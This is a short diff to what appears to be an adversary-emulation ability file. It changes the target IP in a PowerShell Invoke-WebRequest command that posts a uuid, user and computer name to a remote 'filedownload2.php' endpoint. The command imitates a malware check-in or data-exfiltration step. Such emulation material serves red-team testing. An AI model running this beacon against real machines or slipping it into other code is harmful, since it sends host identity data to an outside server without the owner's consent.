@@ -10,7 +10,7 @@
   executors:
   - name: psh
     platform: windows
-    command: Invoke-WebRequest -Uri "http://198.18.128.193/filedownload2.php" -Method
+    command: Invoke-WebRequest -Uri "http://198.18.128.192/filedownload2.php" -Method
       POST -Headers @{ "Content-Type" = "application/x-www-form-urlencoded" } -Body
       "uuid=testuuid&user=testuser&atcomp=testatcomp"
     code: null
